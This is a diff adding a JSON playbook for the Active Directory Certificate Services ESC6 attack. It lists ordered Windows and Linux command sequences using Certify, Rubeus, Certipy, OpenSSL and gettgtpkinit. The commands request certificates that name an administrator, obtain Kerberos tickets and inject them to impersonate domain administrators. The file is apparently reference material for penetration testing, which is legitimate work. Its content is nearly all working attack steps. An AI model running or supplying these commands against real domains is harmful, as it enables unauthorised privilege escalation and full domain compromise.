@@ -1,0 +1,90 @@
+{
+    "ADCSESC6a": {
+        "meaning": "The principal has permission to enroll on one or more certificate templates allowing for authentication. The enterprise CA is configured with the EDITF_ATTRIBUTESUBJECTALTNAME2 flag allowing enrollees to specify a Subject Alternate Name (SAN) identifying another principal during certificate enrollment.",
+        "common": "",
+        "windows": {
+            "Certify": [
+                {
+                    "order": 1,
+                    "command": ".\\Certify.exe request /ca:rootdomaindc.forestroot.com\\forestroot-RootDomainDC-CA /template:ESC6 /altname:ForestRootDA /url:\"tag:microsoft.com,2022-09-14:sid:S-1-5-21-2697957641-2271029196-387917394-500\"",
+                    "description": "Request certificate with SAN specifying target principal to impersonate"
+                },
+                {
+                    "order": 2,
+                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
+                    "description": "Convert emitted certificate to PFX format"
+                },
+                {
+                    "order": 3,
+                    "command": ".\\Rubeus.exe asktgt /certificate:cert.pfx /user:forestrootda /domain:forestroot.com /ptt",
+                    "description": "Request TGT using certificate for target identity impersonation"
+                },
+                {
+                    "order": 4,
+                    "command": "klist",
+                    "description": "Verify TGT by listing Kerberos tickets"
+                }
+            ],
+            "Certify_Simple": [
+                {
+                    "order": 1,
+                    "command": "Certify.exe request /ca:CA_HOST\\CA_NAME /template:VulnTemplate /altname:administrator",
+                    "description": "Request certificate with administrator SAN"
+                },
+                {
+                    "order": 2,
+                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
+                    "description": "Convert certificate to PFX format"
+                },
+                {
+                    "order": 3,
+                    "command": "Rubeus.exe asktgt /certificate:cert.pfx /user:administrator /domain:domain.com /ptt",
+                    "description": "Authenticate as administrator using certificate"
+                }
+            ]
+        },
+        "linux": {
+            "Certipy": [
+                {
+                    "order": 1,
+                    "command": "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -upn administrator@corp.local",
+                    "description": "Request certificate with UPN of target administrator using Certipy"
+                },
+                {
+                    "order": 2,
+                    "command": "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
+                    "description": "Request TGT using certificate for administrator impersonation"
+                }
+            ],
+            "Certipy_DNS": [
+                {
+                    "order": 1,
+                    "command": "certipy req -u john@corp.local -p Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC6 -dns administrator.corp.local",
+                    "description": "Request certificate with DNS SAN for target"
+                },
+                {
+                    "order": 2,
+                    "command": "certipy auth -pfx administrator.pfx -dc-ip 172.16.126.128",
+                    "description": "Authenticate using certificate with DNS SAN"
+                }
+            ],
+            "Manual_OpenSSL": [
+                {
+                    "order": 1,
+                    "command": "openssl req -new -key private.key -out request.csr -subj \"/CN=john\" -addext \"subjectAltName=otherName:msUPN;UTF8:administrator@corp.local\"",
+                    "description": "Create certificate request with UPN SAN using OpenSSL"
+                },
+                {
+                    "order": 2,
+                    "command": "# Submit CSR to CA and retrieve certificate",
+                    "description": "Submit certificate signing request to certificate authority"
+                },
+                {
+                    "order": 3,
+                    "command": "python3 gettgtpkinit.py corp.local/administrator -cert-pfx administrator.pfx -pfx-pass password",
+                    "description": "Use certificate for PKINIT authentication"
+                }
+            ]
+        }
+    }
+}
